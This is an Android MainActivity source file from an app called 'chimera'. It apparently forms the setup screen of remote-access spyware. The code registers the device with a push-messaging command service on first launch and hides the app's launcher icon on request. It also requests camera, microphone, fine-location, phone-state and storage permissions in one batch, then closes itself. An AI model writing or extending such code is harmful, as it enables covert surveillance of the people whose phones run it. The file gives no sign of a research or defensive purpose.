package com.chimera;

import android.Manifest;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CODE = 101;
    private static final String FIRST_RUN_PREF = "isFirstRun";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnContinue = findViewById(R.id.btnContinue);
        Button btnHide = findViewById(R.id.btnHide);

        btnContinue.setOnClickListener(v -> requestPerms());
        btnHide.setOnClickListener(v -> {
            DeviceControlHandler.setComponentState(this, false);
            Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
        });

        handleFirstRunRegistration();
    }

    private void handleFirstRunRegistration() {
        SharedPreferences prefs = getSharedPreferences("chimera_prefs", MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean(FIRST_RUN_PREF, true);
        if (isFirstRun) {
            FCMHandlerService.registerDevice(this);
            prefs.edit().putBoolean(FIRST_RUN_PREF, false).apply();
        }
    }

    private void requestPerms() {
        try {
            List<String> permsToRequest = new ArrayList<>();
            permsToRequest.add(Manifest.permission.CAMERA);
            permsToRequest.add(Manifest.permission.RECORD_AUDIO);
            permsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permsToRequest.add(Manifest.permission.READ_PHONE_STATE);
            
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                permsToRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
            permsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
            }

            List<String> neededPerms = new ArrayList<>();
            for (String p : permsToRequest) {
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                    neededPerms.add(p);
                }
            }
            
            if (!neededPerms.isEmpty()) {
                ActivityCompat.requestPermissions(this, neededPerms.toArray(new String[0]), REQ_CODE);
            } else {
                Toast.makeText(this, "Permissions already granted.", Toast.LENGTH_SHORT).show();
                finish();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "MainActivity_RequestPerms", e);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            Toast.makeText(this, "Setup complete.", Toast.LENGTH_SHORT).show();
            finish();
        }
    }
}